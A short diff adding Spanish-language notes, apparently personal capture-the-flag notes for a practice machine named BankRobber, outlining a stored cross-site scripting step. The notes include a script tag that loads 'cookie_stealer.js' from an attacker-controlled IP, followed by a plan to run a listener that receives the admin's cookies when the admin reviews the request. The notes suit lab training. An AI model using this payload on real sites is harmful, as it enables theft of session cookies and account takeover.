@@ -1,0 +1,9 @@
+[Primero saber en donde se puede hacer una peticion en la que nos interprete el javascript]
+
+[Cuando ya lo tenga tengo que poner lo siguiente para que nos interprete el js]
+
+code --> <script src="http://10.10.14.4/cookie_stealer.js"></script> {cookie_stealer.js esta en el escritorio ya programado}
+
+[Ahora necesitamos tener un servidor en escucha para recibir las cookies del admin, ya que estara revisando nuestra peticion]
+
+{Maquina para testear = BankRobber}
